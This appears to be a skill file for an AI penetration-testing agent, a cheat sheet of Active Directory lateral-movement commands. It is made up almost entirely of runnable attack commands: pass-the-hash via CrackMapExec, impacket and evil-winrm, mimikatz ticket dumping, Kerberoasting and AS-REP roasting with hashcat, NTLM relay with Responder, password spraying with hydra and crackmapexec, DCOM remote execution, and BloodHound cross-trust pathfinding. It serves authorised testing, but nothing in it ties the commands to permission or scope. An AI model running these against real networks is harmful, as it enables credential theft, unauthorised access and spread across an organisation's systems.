# /lateral-movement — Lateral Movement & Credential Reuse

> **Skill type:** Post-Exploitation  
> **Source:** 0x0pointer/skills `/lateral-movement`, 0xsteph/pentest-ai-agents `ad-attacker`  
> **Chains into:** `/ad-assessment`, `/cloud-security`  
> **Chained from:** `/post-exploit`

---

## Pass-the-Hash (PTH)

```bash
# With NTLM hash (from SAM/LSASS dump)
# Format: LM:NTLM (LM can be empty: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH)

# CrackMapExec — spray hash across network
crackmapexec smb 10.0.0.0/24 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:HASH" --local-auth

# impacket — wmiexec
wmiexec.py -hashes :NTLM_HASH Administrator@10.0.0.5

# impacket — psexec
psexec.py -hashes :NTLM_HASH Administrator@10.0.0.5

# impacket — smbexec
smbexec.py -hashes :NTLM_HASH Administrator@10.0.0.5

# evil-winrm (WinRM port 5985/5986)
evil-winrm -i 10.0.0.5 -u Administrator -H "NTLM_HASH"
```

## Pass-the-Ticket (PTT) — Kerberos

```bash
# Dump Kerberos tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Import ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Use ticket (now authenticated as ticket owner)
klist  # Verify ticket loaded
dir \\target\C$  # Access using Kerberos ticket
```

## Kerberoasting

```bash
# Find service accounts with SPNs
# Method 1: impacket
GetUserSPNs.py -request domain.local/user:password -dc-ip 10.0.0.1 -outputfile kerberoast-hashes.txt

# Method 2: PowerShell
setspn -T domain -Q */*

# Method 3: BloodHound (shows Kerberoastable accounts with paths to DA)

# Crack Kerberos TGS tickets (type 13100)
hashcat -a 0 -m 13100 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt
```

## AS-REP Roasting

```bash
# Find accounts with "Do not require Kerberos preauthentication"
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip 10.0.0.1

# Crack (type 18200)
hashcat -a 0 -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

## NTLM Relay

```bash
# Prerequisites: SMB signing disabled on target
# Check: nmap --script smb-security-mode -p 445 TARGET
# "message_signing: disabled" → vulnerable

# Start relay attack
ntlmrelayx.py -tf targets.txt -smb2support

# Also run Responder (but disable SMB/HTTP in Responder config)
# Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -r -d

# When authentication comes in → auto-relayed to target
# Options: -c "command" (execute command), -e "payload.exe" (upload/execute), --no-http-server
```

## Credential Spraying

```bash
# Build username list from OSINT (LinkedIn, email format from other findings)
# Common format: first.last, flast, firstl, etc.

# Spray ONE password against ALL users (avoid lockout)
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Password123!' --continue-on-success
crackmapexec winrm 10.0.0.0/24 -u users.txt -p 'Password123!'

# Web application spraying
hydra -L users.txt -p 'Password123!' target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Check lockout policy first!
crackmapexec smb 10.0.0.1 -u user -p pass --pass-pol
```

## WMI / DCOM Lateral Movement

```bash
# WMI execution (no artifacts on disk)
wmiexec.py domain/user:pass@10.0.0.5 "whoami"
# or: Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt"

# DCOM — MMC Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe", $null, "/c whoami > C:\output.txt", "7")
```

## Cross-Trust Pivoting

```bash
# Enumerate trust relationships
nltest /domain_trusts
Get-ADTrust -Filter *  # PowerShell AD module

# SID History abuse (if trust exists)
# Foreign principal access using SID history

# BloodHound — find cross-trust attack paths
bloodhound-python -u user -p pass -d domain.local -dc-ip 10.0.0.1 --zip
# In BloodHound: "Find Shortest Paths to Domain Admins" across trusts
```
